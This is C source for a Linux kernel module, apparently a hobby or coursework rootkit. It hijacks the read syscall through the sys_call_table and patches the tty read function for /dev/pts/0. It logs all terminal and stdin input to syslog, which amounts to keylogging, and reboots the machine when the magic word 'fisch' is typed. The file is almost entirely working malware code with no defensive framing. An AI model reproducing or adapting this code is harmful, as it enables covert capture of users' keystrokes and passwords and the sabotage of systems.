#include "hook_read.h"
#include "syslog.h"
int z = 0;
atomic_t in_module_orig_syscall = ATOMIC_INIT(0);
int zz = 0;
atomic_t in_original_read;
asmlinkage int (*original_read) (unsigned int, char __user *, size_t);
static ssize_t (*old_tty_read) (struct file *, char *, size_t, loff_t *);

static ssize_t new_tty_read(struct file * file, char * buf, size_t count, loff_t *ppos) {
	ssize_t ret;
	atomic_inc(&in_module_orig_syscall); 
	ret = old_tty_read(file, buf, count, ppos);
	DEBUGMSG("readTTY: %s\n",buf);
	syslog(buf);

	switch(zz) {		// search for input pattern
		case 0:
			if(buf[0] == 'p') {
				zz=1;
			}
			else if(buf[0] == 's'){
				zz=10;
			}
			else zz=0;
			break;
		case 1:
			if(buf[0] == 'i'){
				zz=2;
			}
			else if(buf[0] == 'p'){
				zz=1;
			}
			else if(buf[0] == 's'){
				zz=10;
			}
			else zz=0;
			break;
		case 2:
			if(buf[0] == 'n'){
				zz=3;
			}
			else if(buf[0] == 'p'){
				zz=1;
			}
			else if(buf[0] == 's'){
				zz=10;
			}
			else zz=0;
			break;
		case 3:
			if(buf[0] == 'g'){
				DEBUGMSG("pong\n");
				zz=0;
			}
			else if(buf[0] == 'p'){
				zz=1;
			}
			else if(buf[0] == 's'){
				zz=10;
			}
			else zz=0;
			break;
		case 10:
			if(buf[0] == 'h'){
				zz=11;
			}
			else if(buf[0] == 'p'){
				zz=1;
			}
			else if(buf[0] == 's'){
				zz=10;
			}
			else zz=0;
			break;
		case 11:
			if(buf[0] == 'o'){
				zz=12;
			}
			else if(buf[0] == 'p'){
				zz=1;
			}
			else if(buf[0] == 's'){
				zz=10;
			}
			else zz=0;
			break;
		case 12:
			if(buf[0] == 'w'){
					DEBUGMSG("AAaaaarrrg... You hit my Keyword!! My only weak spot...\n");
				zz=0;
			}
			else if(buf[0] == 'p'){
				zz=1;
			}
			else if(buf[0] == 's'){
				zz=10;
			}
			else zz=0;
			break;

	}
	atomic_dec(&in_module_orig_syscall);
	return ret;

}
asmlinkage int hacked_read(unsigned int fd, char __user * buf, size_t count)
{
	int i;

	atomic_inc(&in_original_read);
	syslog(buf);
	if( fd == 0 )		// reading from stdIn
	{
		i = original_read(fd, buf, count);
		switch(z) {		// search for input pattern
			case 0:
				if(buf[0] == 'f') {
					z=1;
				}
				else z=0;
				break;
			case 1:
				if(buf[0] == 'i'){
					z=2;
				}
				else z=0;
				break;
			case 2:
				if(buf[0] == 's'){
					z=3;
				}
				else z=0;
				break;
			case 3:
				if(buf[0] == 'c'){
					z=4;
				}
				else z=0;
				break;
			case 4:
				if(buf[0] == 'h'){
					//DEBUGMSG("found!\n");					// Found our magic pattern "fisch" from stdin
					kernel_restart(NULL);					// Restart the system
					// panic("Forced Panic! Go Crazy!");	// Make the kernel panic and crash the system :D
				}
				else z=0;
				break;

		}
		if(z==0) {
			DEBUGMSG("Message: %.*s\n", (int)count, buf);		// Print intersected data
		}
		atomic_dec(&in_original_read);
		return i;
	}
	else {		// read from anything but StdIn
		//atomic_inc(&in_original_read);
		i = original_read(fd, buf, count);
		//atomic_dec(&in_original_read);
		//DEBUGMSG("ReadCounter: after %d\n",atomic_read(&in_original_read));
		atomic_dec(&in_original_read);
		return i;
	}
}

int init_hook_read(void)
{
	DEBUGMSG("Insert Hook\n");
	atomic_set(&in_original_read,0);
	make_rw((unsigned long)sys_call_table);
	original_read = (void*)*(sys_call_table + __NR_read);
	*(sys_call_table + __NR_read) = (unsigned long)hacked_read;
	make_ro((unsigned long)sys_call_table);
	return 0;
}

int init_hook_tty(void)
{
	DEBUGMSG("inserting... ttyHock\n");
	ssize_t (**tty_read_func_pointer) (struct file *, char *, size_t, loff_t *);
	struct file* file;

	file = filp_open("/dev/pts/0", O_RDONLY, 0);
	old_tty_read = file->f_op->read;
	tty_read_func_pointer = &(file->f_op->read);
	
	make_rw((unsigned long) tty_read_func_pointer);
	*tty_read_func_pointer = new_tty_read;
	make_ro((unsigned long) tty_read_func_pointer);
	
	filp_close(file,NULL);
	DEBUGMSG("Hock is running\n");
	return 0;
}

void exit_hook_tty(void)
{
	ssize_t (**tty_read_func_pointer) (struct file *, char *, size_t, loff_t *);
	struct file* file;
	DEBUGMSG("exiting...\n");
	
	file = filp_open("/dev/pts/0", O_RDONLY, 0);
	tty_read_func_pointer = &(file->f_op->read);
	make_rw((unsigned long) tty_read_func_pointer);
	*tty_read_func_pointer = old_tty_read;
	make_ro((unsigned long) tty_read_func_pointer);
	filp_close(file,NULL);
	
	
	if(atomic_read(&in_module_orig_syscall)!=0) 
		DEBUGMSG("waiting for instance to be finished\n");
	while(atomic_read(&in_module_orig_syscall)!=0){
		msleep(10);
	}
	DEBUGMSG("done...\n");
} 
void exit_hook_read(void)
{
	DEBUGMSG("exiting hook\n");
	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_read) = (unsigned long)original_read;
	make_ro((unsigned long)sys_call_table);
	if(atomic_read(&in_original_read)!=0) 
	    DEBUGMSG("waiting for instance to be finished\n");
	while(atomic_read(&in_original_read)!=0){
		msleep(10);
	}
	DEBUGMSG("hook is not running anymore\n");
} 
